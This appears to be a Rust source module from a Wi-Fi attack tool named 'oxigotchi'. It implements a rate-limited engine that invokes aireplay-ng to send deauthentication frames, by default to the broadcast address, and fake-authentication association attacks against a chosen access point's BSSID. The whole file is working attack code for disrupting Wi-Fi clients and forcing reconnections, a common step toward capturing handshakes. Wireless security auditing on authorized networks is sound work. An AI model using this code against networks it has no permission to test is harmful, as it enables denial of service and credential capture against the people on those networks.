//! Attack engine for deauth and association attacks

use anyhow::Result;
use std::process::Command;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::time::sleep;

use crate::config::Config;
use crate::wifi::AccessPoint;

/// Attack engine for rate-limited deauth/association attacks
pub struct AttackEngine {
    config: Arc<Config>,
    last_attack: Option<Instant>,
    attack_count: u32,
    rate_limit: u32, // attacks per epoch
}

impl AttackEngine {
    pub async fn new(config: &Arc<Config>) -> Result<Self> {
        Ok(Self {
            config: config.clone(),
            last_attack: None,
            attack_count: 0,
            rate_limit: config.oxigotchi.attack_rate_limit,
        })
    }

    /// Perform deauth attack on target AP
    pub async fn deauth(&mut self, ap: &AccessPoint, client_mac: Option<&str>) -> Result<bool> {
        if !self.can_attack() {
            return Ok(false);
        }

        let target = client_mac.unwrap_or("ff:ff:ff:ff:ff:ff");

        // Use aireplay-ng for deauth
        let mut cmd = Command::new("aireplay-ng");
        cmd.args([
            "--deauth",
            "1",
            "-a",
            &ap.bssid,
            "-c",
            target,
            &format!("{}mon", self.config.main.iface.trim_end_matches("mon")),
        ]);

        let output = cmd.output()?;
        let success = output.status.success();

        if success {
            self.record_attack();
        }

        Ok(success)
    }

    /// Perform association attack
    pub async fn associate(&mut self, ap: &AccessPoint, client_mac: &str) -> Result<bool> {
        if !self.can_attack() {
            return Ok(false);
        }

        let mut cmd = Command::new("aireplay-ng");
        cmd.args([
            "--fakeauth",
            "0",
            "-a",
            &ap.bssid,
            "-h",
            client_mac,
            &format!("{}mon", self.config.main.iface.trim_end_matches("mon")),
        ]);

        let output = cmd.output()?;
        let success = output.status.success();

        if success {
            self.record_attack();
        }

        Ok(success)
    }

    /// Check if we can attack (rate limiting)
    fn can_attack(&mut self) -> bool {
        let now = Instant::now();

        // Reset counter every epoch
        if let Some(last) = self.last_attack {
            if now.duration_since(last) > Duration::from_secs(30) {
                self.attack_count = 0;
            }
        }

        self.attack_count < self.rate_limit
    }

    fn record_attack(&mut self) {
        self.last_attack = Some(Instant::now());
        self.attack_count += 1;
    }

    pub fn reset_epoch(&mut self) {
        self.attack_count = 0;
    }

    pub fn attacks_this_epoch(&self) -> u32 {
        self.attack_count
    }
}
